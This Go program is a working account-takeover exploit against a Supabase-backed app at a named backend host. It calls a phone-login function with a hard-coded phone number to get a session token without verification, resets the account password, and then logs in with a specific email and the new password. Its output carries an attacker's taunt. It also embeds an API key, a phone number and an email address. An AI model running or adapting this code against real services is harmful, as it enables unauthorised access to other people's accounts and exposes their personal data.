package main

import (
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"strings"
)

func main() {
	yrc := "https://backend.appmiaoda.com/projects/supabase258494737491738624"
	anon := "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJhdXRoZW50aWNhdGVkIiwiZXhwIjoyMDgxMDU3MTQ4LCJpc3MiOiJzdXBhYmFzZSIsInJvbGUiOiJhbm9uIiwic3ViIjoiYW5vbiJ9.8xndiuP4qE6WE6AnNtft8cPNPpOGrJLxcZe4yP2Vz60"
	phone := "18175033370"
	chosen := "yrc654321"

	body := strings.NewReader(`{"phone":"` + phone + `"}`)
	req, err := http.NewRequest("POST", yrc+"/functions/v1/phone-login", body)
	if err != nil {
		log.Fatal(err)
	}
	req.Header.Set("apikey", anon)
	req.Header.Set("Content-Type", "application/json")

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		log.Fatal(err)
	}
	raw, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Fatal(err)
	}
	resp.Body.Close()

	var r map[string]interface{}
	err = json.Unmarshal(raw, &r)
	if err != nil {
		log.Fatal(err)
	}
	sess, _ := r["session"].(map[string]interface{})
	tok, _ := sess["access_token"].(string)
	fmt.Println(len(tok))

	body2 := strings.NewReader(`{"password":"` + chosen + `"}`)
	req2, err := http.NewRequest("PUT", yrc+"/auth/v1/user", body2)
	if err != nil {
		log.Fatal(err)
	}
	req2.Header.Set("apikey", anon)
	req2.Header.Set("Authorization", "Bearer "+tok)
	req2.Header.Set("Content-Type", "application/json")

	resp2, err := http.DefaultClient.Do(req2)
	if err != nil {
		log.Fatal(err)
	}
	fmt.Printf("PWD[%s]: %d(Fucked by Error403x!!!)\n", chosen, resp2.StatusCode)
	resp2.Body.Close()

	body3 := strings.NewReader(`{"email":"rcst20@miaoda.com","password":"` + chosen + `"}`)
	req3, err := http.NewRequest("POST", yrc+"/auth/v1/token?grant_type=password", body3)
	if err != nil {
		log.Fatal(err)
	}
	req3.Header.Set("apikey", anon)
	req3.Header.Set("Content-Type", "application/json")

	resp3, err := http.DefaultClient.Do(req3)
	if err != nil {
		log.Fatal(err)
	}
	fmt.Printf("%d(Fucked by Error403x!!!)\n", resp3.StatusCode)
	io.Copy(os.Stdout, resp3.Body)
	resp3.Body.Close()

	fmt.Println()
}